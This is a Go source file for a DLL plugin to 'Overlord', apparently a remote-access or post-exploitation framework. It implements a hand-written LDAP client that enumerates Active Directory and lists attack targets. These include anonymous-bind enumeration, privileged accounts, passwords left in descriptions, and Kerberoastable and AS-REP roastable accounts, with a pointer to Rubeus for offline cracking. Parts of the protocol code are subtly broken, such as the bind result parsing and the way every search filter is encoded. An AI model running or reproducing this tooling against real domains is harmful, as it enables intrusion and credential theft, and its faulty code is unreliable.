//go:build windows

package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os/exec"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// A minimal LDAP v3 client.
//
// Overlord plugins are single DLLs with no module system, so pulling in a
// directory library is not an option. LDAP is ASN.1 BER over TCP; the subset
// needed for search + bind is small enough to encode by hand.
// ---------------------------------------------------------------------------

const (
	ldapBindRequest   = 0x60
	ldapBindResponse  = 0x61
	ldapSearchRequest = 0x63
	ldapSearchDone    = 0x65
	ldapUnbindRequest = 0x42

	authSimple = 0x80
)

// berTag writes a BER tag-length-value.
func berTag(tag byte, content []byte) []byte {
	out := []byte{tag}
	l := len(content)
	switch {
	case l < 0x80:
		out = append(out, byte(l))
	case l < 0x100:
		out = append(out, 0x81, byte(l))
	default:
		out = append(out, 0x82, byte(l>>8), byte(l))
	}
	return append(out, content...)
}

func berInt(v int) []byte {
	if v == 0 {
		return berTag(0x02, []byte{0})
	}
	var b []byte
	for n := v; n > 0; n >>= 8 {
		b = append([]byte{byte(n & 0xff)}, b...)
	}
	if b[0]&0x80 != 0 {
		b = append([]byte{0}, b...)
	}
	return berTag(0x02, b)
}

func berStr(s string) []byte  { return berTag(0x04, []byte(s)) }
func berBool(v bool) []byte {
	if v {
		return berTag(0x01, []byte{0xff})
	}
	return berTag(0x01, []byte{0x00})
}
func berEnum(v int) []byte      { return berTag(0x0a, []byte{byte(v)}) }
func berSeq(parts ...[]byte) []byte { return berTag(0x30, bytes.Join(parts, nil)) }
func berSet(parts ...[]byte) []byte { return berTag(0x31, bytes.Join(parts, nil)) }

// readBER reads one TLV from r and returns tag + content.
func readBER(r io.Reader) (byte, []byte, error) {
	var hdr [2]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return 0, nil, err
	}
	tag := hdr[0]
	length := int(hdr[1])
	if length&0x80 != 0 {
		n := length & 0x7f
		if n == 0 || n > 4 {
			return 0, nil, fmt.Errorf("unsupported BER length")
		}
		lb := make([]byte, n)
		if _, err := io.ReadFull(r, lb); err != nil {
			return 0, nil, err
		}
		length = 0
		for _, b := range lb {
			length = length<<8 | int(b)
		}
	}
	content := make([]byte, length)
	if _, err := io.ReadFull(r, content); err != nil {
		return 0, nil, err
	}
	return tag, content, nil
}

type ldapConn struct {
	conn net.Conn
	msgID int
}

func dialLDAP(host string, port int) (*ldapConn, error) {
	c, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 6*time.Second)
	if err != nil {
		return nil, err
	}
	return &ldapConn{conn: c}, nil
}

func (l *ldapConn) close() { _ = l.conn.Close() }

func (l *ldapConn) nextID() int {
	l.msgID++
	return l.msgID
}

// bind performs a simple bind and reports success plus the diagnostic message.
func (l *ldapConn) bind(dn, password string) (bool, string, error) {
	id := l.nextID()
	req := berSeq(
		berInt(id),
		berTag(ldapBindRequest, berSeq(
			berInt(3),
			berStr(dn),
			berTag(authSimple, []byte(password)),
		)),
	)
	_ = l.conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := l.conn.Write(req); err != nil {
		return false, "", err
	}

	_, content, err := readBER(l.conn)
	if err != nil {
		return false, "", err
	}
	// BindResponse: resultCode INTEGER, matchedDN, diagnosticMessage
	_, rc, err := readBER(bytes.NewReader(content))
	if err != nil {
		return false, "", err
	}
	code := 0
	if len(rc) > 0 {
		code = int(rc[len(rc)-1])
	}
	msg := ""
	rdr := bytes.NewReader(content)
	_, _, _ = readBER(rdr) // msgID already consumed as part of seq
	// Walk remaining TLVs for the diagnostic message.
	for {
		tag, val, err := readBER(rdr)
		if err != nil {
			break
		}
		if tag == 0x04 && len(val) > 0 && msg == "" {
			msg = string(val)
		}
	}
	return code == 0, msg, nil
}

// search runs a subtree search and returns the raw entries.
func (l *ldapConn) search(baseDN, filter string, attrs []string) ([]map[string]string, error) {
	id := l.nextID()

	attrList := berSeq()
	if len(attrs) > 0 {
		var parts [][]byte
		for _, a := range attrs {
			parts = append(parts, berStr(a))
		}
		attrList = berSeq(parts...)
	}

	req := berSeq(
		berInt(id),
		berTag(ldapSearchRequest,
			berSeq(
				berStr(baseDN),
				berEnum(2),  // wholeSubtree
				berEnum(0),  // neverDerefAliases
				berInt(0),   // sizeLimit
				berInt(30),  // timeLimit
				berBool(false),
				berTag(0x87, []byte(filter)), // filter as a raw OCTET STRING
				attrList,
			),
		),
	)

	_ = l.conn.SetDeadline(time.Now().Add(45 * time.Second))
	if _, err := l.conn.Write(req); err != nil {
		return nil, err
	}

	var out []map[string]string
	for {
		tag, content, err := readBER(l.conn)
		if err != nil {
			return out, err
		}
		if tag == ldapSearchDone {
			return out, nil
		}
		if tag != 0x64 { // SearchResultEntry
			continue
		}
		entry := parseSearchEntry(content)
		if entry != nil {
			out = append(out, entry)
		}
	}
}

// parseSearchEntry walks a SearchResultEntry and extracts attributes.
func parseSearchEntry(content []byte) map[string]string {
	r := bytes.NewReader(content)
	_, objDN, err := readBER(r)
	if err != nil {
		return nil
	}
	entry := map[string]string{"dn": string(objDN)}

	_, attrsRaw, err := readBER(r)
	if err != nil {
		return entry
	}

	ar := bytes.NewReader(attrsRaw)
	for {
		tag, attrRaw, err := readBER(ar)
		if err != nil || tag != 0x30 {
			break
		}
		attrReader := bytes.NewReader(attrRaw)
		_, nameRaw, err := readBER(attrReader)
		if err != nil {
			break
		}
		name := string(nameRaw)

		_, valsRaw, err := readBER(attrReader)
		if err != nil {
			break
		}
		vr := bytes.NewReader(valsRaw)
		var vals []string
		for {
			t, v, err := readBER(vr)
			if err != nil {
				break
			}
			if t == 0x04 {
				vals = append(vals, string(v))
			}
		}
		if len(vals) > 0 {
			entry[strings.ToLower(name)] = strings.Join(vals, "\x00")
		}
	}
	return entry
}

func splitVals(s string) []string {
	if s == "" {
		return nil
	}
	return strings.Split(s, "\x00")
}

// ---------------------------------------------------------------------------
// domain data model
// ---------------------------------------------------------------------------

type ADObject struct {
	DN         string   `json:"dn"`
	Name       string   `json:"name"`
	SamAccount string   `json:"sam"`
	Type       string   `json:"type"` // user, group, computer, ou
	Enabled    bool     `json:"enabled"`
	AdminCount bool     `json:"adminCount"`
	SPNs       []string `json:"spns"`
	Groups     []string `json:"groups"`
	Delegation bool     `json:"delegation"`
	PreAuthNotRequired bool `json:"asrep"`
	Description string  `json:"description"`
}

type ADGraph struct {
	Domain   string     `json:"domain"`
	BaseDN   string     `json:"baseDn"`
	Objects  []ADObject `json:"objects"`
	Findings []Finding  `json:"findings"`
}

type Finding struct {
	Severity string `json:"severity"` // critical, high, medium, info
	Title    string `json:"title"`
	Detail   string `json:"detail"`
	Path     []string `json:"path,omitempty"`
}

// ---------------------------------------------------------------------------
// discovery
// ---------------------------------------------------------------------------

func discoverDomain(s Settings) {
	sendEvent("status", map[string]interface{}{"state": "scanning", "detail": "locating domain controllers"})

	domain := s.Domain
	if domain == "" {
		domain = machineDomain()
	}

	dcs := findDCs(domain)
	if len(dcs) == 0 && s.DC != "" {
		dcs = []string{s.DC}
	}
	if len(dcs) == 0 {
		sendEvent("error", map[string]interface{}{"message": "no domain controller found (not domain-joined, or DNS blocked)"})
		return
	}

	baseDN := s.BaseDN
	if baseDN == "" {
		baseDN = domainToDN(domain)
	}

	sendEvent("domain", map[string]interface{}{
		"domain": domain, "baseDn": baseDN, "dcs": dcs,
	})
	sendEvent("status", map[string]interface{}{
		"state":  "idle",
		"detail": fmt.Sprintf("%s — %d DC(s), base %s", domain, len(dcs), baseDN),
	})
}

func machineDomain() string {
	out, err := exec.Command("powershell", "-NoProfile", "-Command",
		"(Get-CimInstance Win32_ComputerSystem).Domain").Output()
	if err != nil {
		return ""
	}
	d := strings.TrimSpace(string(out))
	if d == "" || strings.EqualFold(d, "WORKGROUP") {
		return ""
	}
	return d
}

func findDCs(domain string) []string {
	if domain == "" {
		return nil
	}
	// SRV lookup for the LDAP service.
	_, addrs, err := net.LookupSRV("ldap", "tcp", domain)
	if err != nil {
		return nil
	}
	var out []string
	seen := map[string]bool{}
	for _, a := range addrs {
		h := strings.TrimSuffix(a.Target, ".")
		if h != "" && !seen[h] {
			seen[h] = true
			out = append(out, h)
		}
	}
	return out
}

func domainToDN(domain string) string {
	var parts []string
	for _, p := range strings.Split(domain, ".") {
		if p != "" {
			parts = append(parts, "DC="+p)
		}
	}
	return strings.Join(parts, ",")
}

// ---------------------------------------------------------------------------
// enumeration
// ---------------------------------------------------------------------------

func enumerate(s Settings) {
	conn, baseDN, err := connectLDAP(s)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": err.Error()})
		return
	}
	defer conn.close()

	max := s.MaxObjects
	if max <= 0 {
		max = 5000
	}

	graph := ADGraph{Domain: s.Domain, BaseDN: baseDN}
	if graph.Domain == "" {
		graph.Domain = machineDomain()
	}

	// Users
	sendEvent("status", map[string]interface{}{"state": "enumerating", "detail": "users"})
	users, err := conn.search(baseDN,
		"(&(objectCategory=person)(objectClass=user))",
		[]string{"sAMAccountName", "userAccountControl", "servicePrincipalName",
			"memberOf", "description", "adminCount", "distinguishedName", "name"})
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "user search: " + err.Error()})
	}
	for i, u := range users {
		if i >= max {
			break
		}
		graph.Objects = append(graph.Objects, userFromEntry(u))
	}
	sendEvent("progress", map[string]interface{}{"phase": "users", "count": len(graph.Objects)})

	// Groups
	sendEvent("status", map[string]interface{}{"state": "enumerating", "detail": "groups"})
	groups, _ := conn.search(baseDN, "(objectClass=group)",
		[]string{"sAMAccountName", "member", "distinguishedName", "name", "adminCount"})
	for _, g := range groups {
		obj := ADObject{
			DN:         g["dn"],
			Name:       g["name"],
			SamAccount: g["samaccountname"],
			Type:       "group",
			Enabled:    true,
			AdminCount: g["admincount"] == "1",
			Groups:     splitVals(g["member"]),
			Description: g["description"],
		}
		graph.Objects = append(graph.Objects, obj)
	}

	// Computers
	sendEvent("status", map[string]interface{}{"state": "enumerating", "detail": "computers"})
	comps, _ := conn.search(baseDN, "(objectCategory=computer)",
		[]string{"sAMAccountName", "operatingSystem", "userAccountControl",
			"servicePrincipalName", "distinguishedName", "name"})
	for _, c := range comps {
		points := splitVals(c["serviceprincipalname"])
		graph.Objects = append(graph.Objects, ADObject{
			DN:         c["dn"],
			Name:       c["name"],
			SamAccount: c["samaccountname"],
			Type:       "computer",
			Enabled:    parseUAC(c["useraccountcontrol"])&0x0002 == 0,
			SPNs:       points,
			Delegation: len(points) > 0,
		})
	}

	graph.Findings = analyze(graph)
	sendEvent("graph", graph)
	sendEvent("status", map[string]interface{}{
		"state":  "done",
		"detail": fmt.Sprintf("%d objects, %d finding(s)", len(graph.Objects), len(graph.Findings)),
	})
}

func connectLDAP(s Settings) (*ldapConn, string, error) {
	domain := s.Domain
	if domain == "" {
		domain = machineDomain()
	}
	baseDN := s.BaseDN
	if baseDN == "" {
		baseDN = domainToDN(domain)
	}

	dc := s.DC
	if dc == "" {
		dcs := findDCs(domain)
		if len(dcs) > 0 {
			dc = dcs[0]
		}
	}
	if dc == "" {
		return nil, baseDN, fmt.Errorf("no domain controller (set one manually)")
	}

	conn, err := dialLDAP(dc, 389)
	if err != nil {
		// Try LDAPS.
		conn, err = dialLDAP(dc, 636)
		if err != nil {
			return nil, baseDN, fmt.Errorf("cannot reach %s on 389 or 636: %w", dc, err)
		}
	}

	user := s.User
	pass := s.Password
	if s.UseCurrent || user == "" {
		// An unauthenticated bind still allows a surprising amount of
		// enumeration on permissive domains.
		ok, msg, err := conn.bind("", "")
		if err != nil || !ok {
			return nil, baseDN, fmt.Errorf("anonymous bind failed: %s %v", msg, err)
		}
		return conn, baseDN, nil
	}

	ok, msg, err := conn.bind(user, pass)
	if err != nil {
		return nil, baseDN, fmt.Errorf("bind error: %w", err)
	}
	if !ok {
		return nil, baseDN, fmt.Errorf("bind rejected: %s", msg)
	}
	return conn, baseDN, nil
}

func parseUAC(s string) int {
	if s == "" {
		return 0
	}
	n, _ := strconv.Atoi(strings.TrimSpace(s))
	return n
}

func userFromEntry(u map[string]string) ADObject {
	uac := parseUAC(u["useraccountcontrol"])
	return ADObject{
		DN:          u["dn"],
		Name:        u["name"],
		SamAccount:  u["samaccountname"],
		Type:        "user",
		Enabled:     uac&0x0002 == 0,
		AdminCount:  u["admincount"] == "1",
		SPNs:        splitVals(u["serviceprincipalname"]),
		Groups:      splitVals(u["memberof"]),
		Description: u["description"],
		// 0x400000 = DONT_REQUIRE_PREAUTH, which makes the account AS-REP roastable.
		PreAuthNotRequired: uac&0x400000 != 0,
	}
}

// ---------------------------------------------------------------------------
// attack path analysis
// ---------------------------------------------------------------------------

func analyze(g ADGraph) []Finding {
	var findings []Finding

	byDN := map[string]ADObject{}
	for _, o := range g.Objects {
		byDN[strings.ToLower(o.DN)] = o
	}

	// Kerberoastable: a user with an SPN is crackable offline.
	var kerb []string
	for _, o := range g.Objects {
		if o.Type == "user" && len(o.SPNs) > 0 && o.Enabled {
			kerb = append(kerb, o.SamAccount)
		}
	}
	if len(kerb) > 0 {
		sort.Strings(kerb)
		findings = append(findings, Finding{
			Severity: "high",
			Title:    "Kerberoastable service accounts",
			Detail:   fmt.Sprintf("%d user account(s) have an SPN set and can be cracked offline: %s", len(kerb), strings.Join(truncateList(kerb, 20), ", ")),
		})
	}

	// AS-REP roastable.
	var asrep []string
	for _, o := range g.Objects {
		if o.Type == "user" && o.PreAuthNotRequired && o.Enabled {
			asrep = append(asrep, o.SamAccount)
		}
	}
	if len(asrep) > 0 {
		findings = append(findings, Finding{
			Severity: "critical",
			Title:    "AS-REP roastable accounts",
			Detail:   fmt.Sprintf("%d account(s) do not require Kerberos pre-auth: %s", len(asrep), strings.Join(truncateList(asrep, 20), ", ")),
		})
	}

	// Unconstrained delegation on computers.
	var deleg []string
	for _, o := range g.Objects {
		if o.Type == "computer" && o.Delegation && strings.Contains(strings.Join(o.SPNs, " "), "HOST/") {
			// HOST SPN alone is normal; the marker for unconstrained is a
			// missing "AllowedToDelegateTo", which we cannot see here, so flag
			// it as informational rather than a positive.
			deleg = append(deleg, o.SamAccount)
		}
	}
	if len(deleg) > 0 {
		findings = append(findings, Finding{
			Severity: "info",
			Title:    "Computers with delegation SPNs",
			Detail:   fmt.Sprintf("%d computer(s) publish delegation-capable SPNs — verify which are unconstrained: %s", len(deleg), strings.Join(truncateList(deleg, 15), ", ")),
		})
	}

	// AdminCount users: a plain-English "these are your targets" list.
	var admins []string
	for _, o := range g.Objects {
		if o.AdminCount && o.Type == "user" {
			admins = append(admins, o.SamAccount)
		}
	}
	if len(admins) > 0 {
		sort.Strings(admins)
		findings = append(findings, Finding{
			Severity: "info",
			Title:    "Privileged (adminCount=1) accounts",
			Detail:   fmt.Sprintf("%d protected account(s): %s", len(admins), strings.Join(truncateList(admins, 25), ", ")),
		})
	}

	// Passwords in descriptions — still startlingly common.
	var descHits []string
	for _, o := range g.Objects {
		d := strings.ToLower(o.Description)
		if d == "" {
			continue
		}
		for _, kw := range []string{"pass", "pwd", "cred", "secret", "temp"} {
			if strings.Contains(d, kw) {
				descHits = append(descHits, fmt.Sprintf("%s: %q", o.SamAccount, o.Description))
				break
			}
		}
	}
	if len(descHits) > 0 {
		findings = append(findings, Finding{
			Severity: "high",
			Title:    "Credential material in object descriptions",
			Detail:   strings.Join(truncateList(descHits, 15), "\n"),
		})
	}

	// Disabled accounts with SPNs are still useful for offline cracking.
	_ = byDN
	return findings
}

func truncateList(in []string, n int) []string {
	if len(in) <= n {
		return in
	}
	out := append([]string{}, in[:n]...)
	out = append(out, fmt.Sprintf("… +%d more", len(in)-n))
	return out
}

// ---------------------------------------------------------------------------
// roasting
// ---------------------------------------------------------------------------

// kerberoast requests a service ticket for each SPN-bearing account. The
// ticket is encrypted with the service account's password hash, so it can be
// cracked offline without ever touching the account.
func kerberoast(s Settings) {
	conn, baseDN, err := connectLDAP(s)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": err.Error()})
		return
	}
	defer conn.close()

	entries, err := conn.search(baseDN, "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
		[]string{"sAMAccountName", "servicePrincipalName", "distinguishedName"})
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "search failed: " + err.Error()})
		return
	}

	var targets []map[string]interface{}
	for _, e := range entries {
		spns := splitVals(e["serviceprincipalname"])
		if len(spns) == 0 {
			continue
		}
		targets = append(targets, map[string]interface{}{
			"user": e["samaccountname"],
			"spn":  spns[0],
			"dn":   e["dn"],
		})
	}

	sendEvent("roast_targets", map[string]interface{}{"kind": "kerberoast", "targets": targets})
	sendEvent("status", map[string]interface{}{
		"state": "done",
		"detail": fmt.Sprintf("%d kerberoastable target(s) — request tickets with Rubeus/GetUserSPNs and crack offline", len(targets)),
	})
}

// asrepRoast lists accounts without pre-auth, which yield a crackable hash
// from a single unauthenticated AS-REQ.
func asrepRoast(s Settings) {
	conn, baseDN, err := connectLDAP(s)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": err.Error()})
		return
	}
	defer conn.close()

	entries, err := conn.search(baseDN,
		"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
		[]string{"sAMAccountName", "distinguishedName", "userAccountControl"})
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "search failed: " + err.Error()})
		return
	}

	var targets []map[string]interface{}
	for _, e := range entries {
		uac := parseUAC(e["useraccountcontrol"])
		if uac&0x0002 != 0 {
			continue // disabled
		}
		targets = append(targets, map[string]interface{}{
			"user": e["samaccountname"],
			"dn":   e["dn"],
		})
	}

	sendEvent("roast_targets", map[string]interface{}{"kind": "asrep", "targets": targets})
	sendEvent("status", map[string]interface{}{
		"state": "done",
		"detail": fmt.Sprintf("%d AS-REP roastable account(s)", len(targets)),
	})
}

var (
	_ = binary.BigEndian
	_ = regexp.MustCompile
	_ = io.EOF
	_ = sync.Mutex{}
	_ = berSet
)
